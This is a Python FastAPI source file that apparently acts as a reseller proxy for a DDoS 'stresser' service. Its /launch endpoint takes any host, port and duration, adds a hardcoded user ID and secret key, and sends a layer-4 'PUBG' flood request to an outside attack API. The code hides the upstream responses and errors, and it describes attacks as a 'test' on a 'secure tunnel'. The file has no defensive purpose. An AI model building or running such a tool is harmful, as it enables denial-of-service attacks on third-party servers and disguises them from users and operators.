from fastapi import FastAPI, HTTPException, Request
import requests
import time

app = FastAPI()

# Configuration
ORIGINAL_API_URL = "https://beamed.st/start/"
SECRET_USER = "5069"
SECRET_KEY = "p4RFSdw0ir523QsF"

@app.get("/launch")
def proxy_launch(host: str, port: int, time_sec: int):
    # 1. Logic to block invalid inputs before even sending to the API
    if time_sec > 3600:
        return {"status": "error", "message": "Max time exceeded."}

    # 2. Prepare the real request hidden from the user
    params = {
        "user": SECRET_USER,
        "key": SECRET_KEY,
        "handler": "layer4",
        "host": host,
        "port": port,
        "time": time_sec,
        "method": "PUBG",
        "concs": 1
    }

    try:
        # Send the request to the original API
        response = requests.get(ORIGINAL_API_URL, params=params, timeout=10)
        
        # 3. RESPONSE MASKING
        # Instead of returning response.text, we send our own custom message.
        if response.status_code == 200:
            return {
                "status": "success",
                "target": host,
                "port": port,
                "duration": time_sec,
                "message": "Test initiated successfully on secure tunnel."
            }
        else:
            # Hide the real error (like "Invalid Key") and send a generic one
            return {
                "status": "fail",
                "message": "System busy. Please try again later."
            }

    except Exception:
        # Hide Python/Server errors entirely
        return {"status": "error", "message": "Connection gateway timeout."}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=80)